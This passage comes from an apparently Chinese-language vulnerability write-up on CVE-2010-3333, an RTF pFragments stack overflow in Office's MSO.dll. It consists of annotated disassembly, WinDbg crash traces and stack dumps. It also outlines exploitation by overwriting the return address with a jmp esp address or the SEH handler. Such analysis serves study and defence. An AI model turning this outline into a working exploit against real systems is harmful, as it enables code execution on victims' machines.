class="comment">; edi = esi+0xc0 = 0x00123aa8+0xc0 = 0x00123B68</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EAD F6 <span class="number">07</span> <span class="number">01</span>               <span class="keyword">test</span>    <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>], <span class="number">1</span>   <span class="comment">; [edi] = [0x00123B68] = 0x73('s')</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EB0 <span class="number">74</span> <span class="number">09</span>                  <span class="keyword">jz</span>      short loc_30D29EBB  <span class="comment">; 等于0跳转,这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EB2         loc_30D29EB2:                         </span><br><span class="line"><span class="symbol">    .text:</span>30D29EB2 5F                     <span class="keyword">pop</span>     <span class="built_in">edi</span>                 <span class="comment">; edi = 0x001239a4(像是对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EB3 <span class="number">8D</span> <span class="number">86</span> C4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>+<span class="number">0C4h</span>]     <span class="comment">; eax = esi+0xc4 = 0x00123aa8+0xc4 = 0x00123b6c</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EB9 5E                     <span class="keyword">pop</span>     <span class="built_in">esi</span>                 <span class="comment">; esi = 0x00000000</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EBA C3                     <span class="keyword">retn</span>                        <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>30F0B5DF FF <span class="number">75</span> 0C               <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]         <span class="comment">; arg3: [ebp+0xC] = [0x001237ec+0xC] = [0x001237f8] = 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5E2 8B <span class="number">70</span> <span class="number">64</span>               <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">eax</span>+<span class="number">64h</span>]      <span class="comment">;     esi = [0x00123b6c+0x64] = [0x00123bd0] = 0x01c40824(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5E5 <span class="number">83</span> <span class="number">65</span> F8 <span class="number">00</span>            <span class="keyword">and</span>     [<span class="built_in">ebp</span>+var_8], <span class="number">0</span>      <span class="comment">;     [ebp-0x8] = [0x001237ec-0x8] = [0x001237e4]=0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5E9 8B <span class="number">06</span>                  <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>]          <span class="comment">;     eax = [esi] = [0x01c40824] = 0x30da33d8(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5EB <span class="number">8D</span> <span class="number">4D</span> F0               <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_10]   <span class="comment">;     ecx = ebp-0x10 = 0x001237ec-0x10 = 0x001237dc</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5EE <span class="number">51</span>                     <span class="keyword">push</span>    <span class="built_in">ecx</span>                 <span class="comment">; arg2: ecx = 0x001237dc &lt;----目的地址</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5EF BB <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">05</span>         <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="number">5000000h</span>       <span class="comment">;     ebx = 0x05000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5F4 <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">; arg1: esi = 0x01c40824 &lt;----对象首地址</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5F5 <span class="number">89</span> <span class="number">5D</span> F4               <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_C], <span class="built_in">ebx</span>    <span class="comment">;     [ebp-0xc] = [0x001237ec-0xc] = [0x001237e0] = 0x05000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5F8 FF <span class="number">50</span> 1C               <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">1Ch</span>] &lt;----- [<span class="built_in">eax</span>+<span class="number">1Ch</span>] = [<span class="number">0x30da33d8</span>+<span class="number">0x1c</span>] = [<span class="number">0x30da33f4</span>] = <span class="number">0x30ED4406</span>(虚函数地址)</span><br><span class="line"><span class="symbol">.text:</span>30F0B5FB 8B <span class="number">45</span> <span class="number">14</span>               <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_C]</span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line">*************************************************************</span><br><span class="line"></span><br><span class="line">    void __stdcall sub_30ED4406(<span class="keyword">int</span> a1, void *a2, <span class="keyword">int</span> a3)</span><br><span class="line"></span><br><span class="line">*************************************************************</span><br><span class="line"><span class="symbol">.text:</span>30ED4406 <span class="number">57</span>                     <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">;     edi = 0x001239a4(像是对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4407 8B 7C <span class="number">24</span> 0C            <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">esp</span>+<span class="number">4</span>+arg_4]  <span class="comment">; 目的地址: edi = [esp+4+8] = [0x001237b8+0xc] = [0x001237c4] = 0x001237dc(a2)</span></span><br><span class="line"><span class="symbol">.text:</span>30ED440B <span class="number">85</span> FF                  <span class="keyword">test</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>            <span class="comment">;     edi &amp; edi</span></span><br><span class="line"><span class="symbol">.text:</span>30ED440D <span class="number">74</span> <span class="number">27</span>                  <span class="keyword">jz</span>      short loc_30ED4436  <span class="comment">;     edi为0,则跳转,这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>30ED440F 8B <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>            <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">4</span>+arg_0]  <span class="comment">;     eax = [esp+4+4] = [0x001237b8+0x8]= [0x001237c0] = 0x01c40824(a1) &lt;----对象首地址</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4413 8B <span class="number">48</span> <span class="number">08</span>               <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>+<span class="number">8</span>]        <span class="comment">;     ecx = [eax+0x8] = [0x01c40824+0x8] = [0x01c4082c] = 0x0004c8ac</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4416 <span class="number">81</span> E1 FF FF <span class="number">00</span> <span class="number">00</span>      <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFFFh</span>         <span class="comment">;     ecx = ecx &amp; 0xFFFF = 0xc8ac</span></span><br><span class="line"><span class="symbol">.text:</span>30ED441C <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">;     esi = 0x01c40824(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30ED441D 8B F1                  <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ecx</span>            <span class="comment">;     esi = ecx = 0xc8ac</span></span><br><span class="line"><span class="symbol">.text:</span>30ED441F 0F AF <span class="number">74</span> <span class="number">24</span> <span class="number">14</span>         <span class="keyword">imul</span>    <span class="built_in">esi</span>, [<span class="built_in">esp</span>+<span class="number">8</span>+arg_8]  <span class="comment">;     esi = esi*[esp+8+0xc] = 0xc8ac*[0x001237b4+0x14] = 0xc8ac*[0x001237c8] = 0xc8ac*0x00000000 = 0x0(a3)</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4424 <span class="number">03</span> <span class="number">70</span> <span class="number">10</span>               <span class="keyword">add</span>     <span class="built_in">esi</span>, [<span class="built_in">eax</span>+<span class="number">10h</span>]      <span class="comment">; 源地址: esi = esi + [0x01c40824+0x10] = 0 + [0x01c40834] = 0x1104000c</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4427 8B C1                  <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span>            <span class="comment">; 返回复制数据长度(字节): eax = ecx = 0xc8ac</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4429 C1 E9 <span class="number">02</span>               <span class="keyword">shr</span>     <span class="built_in">ecx</span>, <span class="number">2</span>              <span class="comment">; 复制数据dword数: ecx = ecx &gt;&gt; 2 = 0xc8ac/4 = 0x0000322b </span></span><br><span class="line"><span class="symbol">.text:</span>30ED442C F3 A5                  <span class="keyword">rep</span> <span class="keyword">movsd</span>                   <span class="comment">; rep movs dword ptr es:[edi],dword ptr [esi]</span></span><br><span class="line">                                                                栈数据：</span><br><span class="line">                                                                001237B4   01C40824 &lt;-<span class="built_in">esp</span></span><br><span class="line">                                                                001237B8   001239A4</span><br><span class="line">                                                                001237BC   30F0B5FB  返回到 mso.30F0B5FB</span><br><span class="line">                                                                001237C0   01C40824</span><br><span class="line">                                                                001237C4   001237DC</span><br><span class="line">                                                                001237C8   <span class="number">00000000</span></span><br><span class="line">                                                                001237CC   <span class="number">00000000</span></span><br><span class="line">                                                                001237D0   <span class="number">00000000</span></span><br><span class="line">                                                                001237D4   <span class="number">00000000</span></span><br><span class="line">                                                                001237D8   0000FF35</span><br><span class="line">                                                                001237DC   FFFF0000 &lt;-pFragments缓冲区起始地址</span><br><span class="line">                                                                001237E0   <span class="number">05000000</span></span><br><span class="line">                                                                001237E4   <span class="number">00000000</span></span><br><span class="line">                                                                001237E8   0000FFFF</span><br><span class="line">                                                                001237EC   0012381C &lt;-<span class="built_in">ebp</span></span><br><span class="line">                                                                001237F0   30F0B56B  返回到 mso.30F0B56B 来自 mso.30F0B5C2</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;根据调试的结果，我们可以知道，<code>CrashFun(sub_30ED4406)</code>是在函数<code>sub_30F0B5C2</code>中地址<code>0x30F0B5F8</code>处的指令调用的。最后一条指令是<code>rep movsd</code>，其从<code>源地址(esi=0x1104000c)</code>循环复制数据到<code>目的地址(edi=0x001237dc)</code>，每次复制一个<code>dword</code>，复制数据的<code>dword个数</code>在<code>ecx(0x322b)</code>中，也就是<code>0xc8ac字节</code>。其实这个长度是源于<code>样本数据</code>的，它位于<code>pFragements</code>属性值的<code>第3个字段</code>，<code>偏移8个字符</code>后的<code>4个字符</code>即为复制数据的大小，如图：<br><img src="/resources/2020/CVE-2010-3333/pFragements.png" alt="样本中代表复制内存大小的数据"></p>
<p>&emsp;&emsp;<code>pFragements</code>数据在<code>栈</code>上的缓冲区的<code>起始地址</code>为<code>0x001237DC</code>,而<code>ebp</code>为<code>0x001237EC</code>,其后就是函数<code>sub_30ED4406</code>的<code>返回地址</code>。由于PoC中的pFragements属性值的数据量过大，覆盖到<code>不可写的内存地址</code>导致异常，所以并没有去<code>执行</code>覆盖后的<code>返回地址</code>以及<code>SEH异常处理函数</code>(SEH链被破坏了)。根据<code>MSO.dll</code>模块函数的<code>反汇编特征</code>，可以看出，<code>MSO.dll</code>模块并没有开启<code>GS</code>。通过查看<code>MSO.dll</code>的<code>IMAGE_OPTIONAL_HEADER</code>中的<code>DllCharacteristics</code>字段，其并没有设置<code>IMAGE_DLLCHARACTERISTICS_NX_COMPAT</code>标志，可以知道MSO.dll并没有开启<code>DEP</code>，即使开启了DEP，在<code>Windows XP SP3</code>上也是没有效果的。</p>
<p>&emsp;&emsp;所以我们可以将<code>Shellcode</code>直接布置在<code>栈</code>上，首先需要填充<code>pFragments缓冲区起始地址</code>到<code>保存返回地址的栈地址</code>之前的栈内存，是<code>0x14</code>字节，然后用<code>jmp esp</code>指令的地址覆盖<code>返回地址</code>，将<code>Shellcode</code>放置在返回地址的后面，就可以劫持<code>程序执行流</code>，执行任意代码。也可以通过覆盖<code>返回地址</code>之后的<code>SEH异常处理函数</code>的地址，劫持异常处理，获得<code>程序的执行流</code>。这些到后面漏洞利用章节再细细展开。</p>
<h4 id="2、Win7-amp-Office2007"><a href="#2、Win7-amp-Office2007" class="headerlink" title="2、Win7&amp;Office2007"></a>2、Win7&amp;Office2007</h4><p>&emsp;&emsp;首先打开<code>WINWORD.exe</code>，然后打开<code>WinDbg</code>，Attach上WINWORD.exe的进程，程序会自动中断在<code>ntdll!DbgBreakPoint</code>处，<code>g</code>运行程序，然后打开<code>CVE-2010-3333(target6,Crash).rtf</code>文件，程序会中断在<code>MSO.dll</code>的<code>0x32cf3814</code>处，此处就是<code>触发异常</code>的指令：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> 3bd10000 3bea5000   C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\OFFICE12\OGL.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 3fd00000 3fd0d000   C:\Windows\system32\WTSAPI32.DLL</span><br><span class="line">(d9c.4a8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=3c524228 <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0011fdfc <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=066a55e0 <span class="built_in">edi</span>=0011ffb8</span><br><span class="line"><span class="built_in">eip</span>=32cf3814 <span class="built_in">esp</span>=0011fdb0 <span class="built_in">ebp</span>=0011fdb0 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office12\mso.dll - </span><br><span class="line">mso!Ordinal7356+<span class="number">0x1315</span>:</span><br><span class="line">32cf3814 8b4804          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">4</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:3c52422c=????????</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !address 3c52422c              </span><br><span class="line">Failed to map Heaps (error <span class="number">80004005</span>)</span><br><span class="line"><span class="symbol">Usage:</span>                  Free</span><br><span class="line">Base Address:           3c413000</span><br><span class="line">End Address:            3fd00000</span><br><span class="line">Region Size:            038ed000</span><br><span class="line"><span class="symbol">Type:</span>                   <span class="number">00000000</span>    </span><br><span class="line"><span class="symbol">State:</span>                  <span class="number">00010000</span>    MEM_FREE</span><br><span class="line"><span class="symbol">Protect:</span>                <span class="number">00000001</span>    PAGE_NOACCESS</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们通过<code>!address</code>命令查看触发异常的指令<code>mov ecx,dword ptr [eax+4]</code>所访问的内存地址<code>0x3c52422c</code>的相关信息，可以发现此地址是不具有访问权限的(<code>PAGE_NOACCESS</code>)。然后，我们需要追踪<code>数据流</code>。首先查看<code>栈回溯</code>:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="symbol">WARNING:</span> Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line">0011fdb0 32e5944d 0011fdc4 <span class="number">41306141</span> <span class="number">05000000</span> mso!Ordinal7356+<span class="number">0x1315</span>(32cf3814当前指令地址)</span><br><span class="line">             ↑------------------------------------------↓</span><br><span class="line">0011fdcc 32e595bf <span class="number">41306141</span> <span class="number">41386141</span> 0011fdfc mso!Ordinal2605+<span class="number">0x326e</span>(32e5944d)[mso!Ordinal7356+<span class="number">0x1308</span> (32cf3807)的返回地址]</span><br><span class="line">             ↑------------------------------------------↓</span><br><span class="line">0011fe04 <span class="number">37614136</span> <span class="number">41386141</span> <span class="number">62413961</span> <span class="number">31624130</span> mso!Ordinal2605+<span class="number">0x33e0</span>(32e595bf)[mso!Ordinal2605+<span class="number">0x323c</span> (32e5941b)的返回地址]</span><br><span class="line">0011fe08 <span class="number">41386141</span> <span class="number">62413961</span> <span class="number">31624130</span> <span class="number">41326241</span> <span class="number">0x37614136</span></span><br><span class="line">0011fe0c <span class="number">62413961</span> <span class="number">31624130</span> <span class="number">41326241</span> <span class="number">62413362</span> <span class="number">0x41386141</span></span><br><span class="line">0011fe10 <span class="number">31624130</span> <span class="number">41326241</span> <span class="number">62413362</span> <span class="number">35624134</span> <span class="number">0x62413961</span></span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;触发异常的指令(<code>0x32cf3814</code>)所在函数是<code>sub_32CF3807</code>，其父函数为<code>sub_32E5941B</code>，由于栈已被破坏，所以无法再回溯。通过IDA及<code>sub_32E5941B的返回地址</code>(0x32e595bf)，我们可以知道，<code>sub_32E5941B</code>的父函数是<code>sub_32E5955E</code>。通过对这几个函数详细分析，得到的结果如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">*************************************************************************************************</span><br><span class="line"></span><br><span class="line">    char __userpurge sub_32E5955E@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">eax</span>&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">*************************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>32E5955E                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011fe34 </span></span><br><span class="line"><span class="symbol">.text:</span>32E5955F                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011fe04 </span></span><br><span class="line"><span class="symbol">.text:</span>32E59561                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">14h</span>                 <span class="comment">;   esp = esp-0x14 = 0x0011fe04-0x14 = 0x0011fdf0 </span></span><br><span class="line"><span class="symbol">.text:</span>32E59564                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_10], <span class="number">0</span>          <span class="comment">;   [ebp+0x18] = [0x0011fe04+0x18] = [0x0011fe1c] = 0x02360818(a6)</span></span><br><span class="line"><span class="symbol">.text:</span>32E59568                 <span class="keyword">push</span>    <span class="built_in">edi</span>                      <span class="comment">;   edi = 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>32E59569                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span>                 <span class="comment">;   edi = eax = 0x0011ffb8(a1)</span></span><br><span class="line"><span class="symbol">.text:</span>32E5956B                 <span class="keyword">jnz</span>     short loc_32E5957E       <span class="comment">;   不为零，跳转，这里跳转</span></span><br><span class="line">......                          </span><br><span class="line"><span class="symbol">.text:</span>32E5957E                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">edi</span>+<span class="number">8</span>]             <span class="comment">;   ecx = [edi+8] = [0x0011ffb8+8] = [0x0011ffc0] = 0x001200d8</span></span><br><span class="line"><span class="symbol">.text:</span>32E59581                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                      <span class="comment">;   ebx = 0x00000000 </span></span><br><span class="line"><span class="symbol">.text:</span>32E59582                 <span class="keyword">push</span>    <span class="built_in">esi</span>                      <span class="comment">;   esi = 0x00000000 </span></span><br><span class="line"><span class="symbol">.text:</span>32E59583                 <span class="keyword">call</span>    sub_327A2549             <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span>32E59588                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]              <span class="comment">; arg3: [ebp+0xc] = [0x0011fe04+0xc] = [0x0011fe10] = 0x00000000(a3)</span></span><br><span class="line"><span class="symbol">.text:</span>32E5958B                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">eax</span>+<span class="number">64h</span>]           <span class="comment">;   esi = [eax+0x64] = [0x001201ac+0x64] = [0x00120210] = 0x066a55e0(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>32E5958E                 <span class="keyword">and</span>     [<span class="built_in">ebp</span>+var_8], <span class="number">0</span>           <span class="comment">;   [ebp-8] = [0x0011fe04-0x8] = [0x0011fdfc] = 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>32E59592                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>]               <span class="comment">;   eax = [esi] = [0x066a55e0] = 0x32a0c8c4(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>32E59594                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_10]        <span class="comment">;   ecx = ebp-0x10 = 0x0011fe04-0x10 = 0x0011fdf4 &lt;----(5)</span></span><br><span class="line"><span class="symbol">.text:</span>32E59597                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                      <span class="comment">; arg2: ecx = 0x0011fdf4(目的地址)</span></span><br><span class="line"><span class="symbol">.text:</span>32E59598                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="number">5000000h</span>            <span class="comment">;   ebx = 0x05000000</span></span><br><span class="line"><span class="symbol">.text:</span>32E5959D                 <span class="keyword">push</span>    <span class="built_in">esi</span>                      <span class="comment">; arg1: esi = 0x066a55e0(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>32E5959E                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_C], <span class="built_in">ebx</span>         <span class="comment">;   [ebp-0xc] = [0x0011fe04-0xc] = [0x0011fdf8] = ebx = 0x05000000</span></span><br><span class="line"><span class="symbol">.text:</span>32E595A1                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">1Ch</span>]      <span class="comment">; [eax+0x1c] = [0x32a0c8c4+0x1c] = [0x32a0c8e0] = 0x327c002c(虚函数地址) &lt;----(6)</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>327C002C                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011fe04 </span></span><br><span class="line"><span class="symbol">    .text:</span>327C002D                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011fdd0 </span></span><br><span class="line"><span class="symbol">    .text:</span>327C002F                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+Dst], <span class="number">0</span>             <span class="comment">;   [ebp+Dst] = [0x0011fdd0+0xc] = [0x0011fddc] = 0x0011fdf4(a2)(目的地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0033                 <span class="keyword">jz</span>      short loc_327C0054       <span class="comment">;   等于0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0035                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+arg_0]         <span class="comment">;   ecx = [ebp+8] = [0x0011fdd0+8] = [0x0011fdd8] = 0x066a55e0(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0038                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ecx</span>+<span class="number">0Ch</span>]           <span class="comment">;   eax = [ecx+0xc] = [0x066a55e0+0xc] = [0x066a55ec] = 0x0004c8ac(成员变量，复制数据长度)</span></span><br><span class="line"><span class="symbol">    .text:</span>327C003B                 <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="number">0FFFFh</span>              <span class="comment">;   eax = eax &amp; 0xFFFF = 0x0004c8ac&amp;0xFFFF = 0xc8ac</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0040                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; Size   ; arg3复制数据长度: eax = 0xc8ac</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0041                 <span class="keyword">imul</span>    <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_8]         <span class="comment">;   eax = eax*[0x0011fdd0+0x10] = 0xc8ac*0x0 = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0045                 <span class="keyword">add</span>     <span class="built_in">eax</span>, [<span class="built_in">ecx</span>+<span class="number">10h</span>]           <span class="comment">;   eax = eax+[0x066a55e0+0x10] = 0x0+0x1d400000 = 0x1d400000</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0048                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; Src    ; arg2源地址: eax = 0x1d400000</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0049                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+Dst]       <span class="comment">; Dst    ; arg1目的地址: [ebp+0xc] = [0x0011fdd0+0xc] = [0x0011fddc] = 0x0011fdf4(a2)</span></span><br><span class="line"><span class="symbol">    .text:</span>327C004C                 <span class="keyword">call</span>    memcpy                   <span class="comment">; 0x0012c6a0 - 0x0011fdf4 = 0xc8ac未出现非法内存访问,栈已被破坏</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0051                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">0Ch</span>                 <span class="comment">;   esp = esp+0xc = 0x0011fdc4+0xc = 0x0011fdd0 </span></span><br><span class="line"><span class="symbol">    .text:</span>327C0054                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011fe04</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0055                 <span class="keyword">retn</span>    <span class="number">0Ch</span>                      <span class="comment">;   esp -&gt; 0x32e595a4(返回地址) </span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>32E595A4                 <span class="keyword">mov</span>     